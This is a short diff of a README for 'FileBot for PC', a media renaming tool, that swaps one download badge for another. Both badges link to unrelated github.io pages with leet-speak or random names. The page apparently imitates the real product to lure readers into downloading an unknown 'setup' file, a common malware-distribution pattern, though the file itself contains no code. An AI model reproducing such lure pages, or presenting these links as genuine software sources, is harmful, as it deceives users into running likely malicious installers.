@@ -1,11 +1,6 @@
 # 📂 **FILEBOT FOR PC**  
 ### 🛠️ *Organize, rename, and subtitle your media effortlessly.*
-
-<p align="center">
-  <a href="https://fileb0t4pcd0wnload-inf0.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-FILEBOT_SETUP-0078d4?style=for-the-badge&logo=mediabook&logoColor=white" alt="Download FileBot Setup" />
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://iaiamennqj.github.io/.github/filebot-pc)
 
 ---
 
